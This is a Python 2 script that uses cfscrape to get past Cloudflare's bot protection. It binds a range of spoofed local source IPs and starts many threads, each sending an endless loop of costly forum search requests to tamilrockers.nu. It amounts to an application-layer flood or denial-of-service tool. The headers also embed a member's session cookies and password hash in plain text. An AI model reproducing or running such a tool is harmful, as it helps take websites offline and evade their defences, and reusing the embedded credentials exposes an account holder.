import cfscrape
import requests
import threading
import sys
from requests_toolbelt.adapters import source
inc=0


def process(scraper1,ip):
 global inc
 while(1):
  print scraper1.get("http://tamilrockers.nu/index.php?app=core&module=search&do=search&andor_type=and&sid=38f869bef6a07185cdfac88653d2f212&search_date_start=July%2014,%202005%204:25%20PM&search_date_end=July%207,%202017%204:26%20PM&search_app_filters[forums][sortKey]=posts&search_app_filters[forums][sortDir]=1&search_content=both&search_app_filters[forums][forums][0]=121&search_app_filters[forums][noPreview]=1&search_app_filters[forums][pCount]=1&search_app_filters[forums][pViews]=1&search_app_filters[forums][sortKey]=posts&search_app_filters[forums][sortDir]=1&search_term=dvd"+str(inc)+"search_app=forums&st=10",headers={'Cookie':'__cfduid=df5f5619bd6b4ad2e8a93ae1e38f6129c1499324377; member_id=310948; pass_hash=8d85b68c8f9b602a82598905b1818c1f; ipsconnect_ee875b3eff9c3079630963d5fa229c71=1; member_id=310948; pass_hash=8d85b68c8f9b602a82598905b1818c1f; rteStatus=rte; itemMarking_forums_items=eJyrVjI1MzYyUbIyNLG0NDEyMbM01AEKmVmYwYSMLEwNawGkqAhS; sfc=1499432187; sfct=dvds; itemMarking_videos_items=eJyrVjI3NDVTsjI0sbQ0MTI3sTCpBVwwKsQEXg%2C%2C; session_id=effc228aaafbff3e9245f8e173b5f980; __test; coppa=0; modtids=%2C','Referer':'http://tamilrockers.nu/index.php/topic/'+str(inc)}).status_code,' @',ip
 # print scraper1.get("http://tamilrockers.nu/index.php?app=core&module=attach&section=attach&attach_id="+str(inc),header={'Cookie':'__cfduid=df5f5619bd6b4ad2e8a93ae1e38f6129c1499324377; member_id=310948; pass_hash=8d85b68c8f9b602a82598905b1818c1f; ipsconnect_ee875b3eff9c3079630963d5fa229c71=1; member_id=310948; pass_hash=8d85b68c8f9b602a82598905b1818c1f; rteStatus=rte; itemMarking_forums_items=eJyrVjI1MzYyUbIyNLG0NDEyMbM01AEKmVmYwYSMLEwNawGkqAhS; sfc=1499432187; sfct=dvds; itemMarking_videos_items=eJyrVjI3NDVTsjI0sbQ0MTI3sTCpBVwwKsQEXg%2C%2C; session_id=effc228aaafbff3e9245f8e173b5f980; __test; coppa=0; modtids=%2C','Referer':'http://tamilrockers.nu/index.php/topic/'+str(inc)}).status_code,' @',ip
  inc=inc+1




try:
 ip_bits=sys.argv[1].split('.');
 host_bit=int(ip_bits[3]);
except:
 print "Invalid ip address"
 sys.exit(0)

try:
 no_of_ip=int(sys.argv[2])
except:
 print "Invalid 2nd Argv"
 sys.exit(0)
iplist=[]
for i in range(0,no_of_ip):
 iplist.append(ip_bits[0]+'.'+ip_bits[1]+'.'+ip_bits[2]+'.'+str(host_bit+i))
 
for (x,source_ip) in enumerate(iplist):
 
 scraper = cfscrape.create_scraper()  # returns a CloudflareScraper instance
 # Or: scraper = cfscrape.CloudflareScraper()  # CloudflareScraper inherits from requests.Session
 new_source = source.SourceAddressAdapter(source_ip)
 scraper.mount('http://', new_source)
 scraper.mount('https://', new_source) 
 print scraper.get("http://tamilrockers.lv").request.headers


 session = requests.session()
 scraper1 = cfscrape.create_scraper(sess=session)
 scraper1.mount('http://', new_source)
 scraper1.mount('https://', new_source)
 for i in range(int(sys.argv[3])):
  t2=threading.Thread(target=process,args=(scraper1,source_ip))
  t2.start()
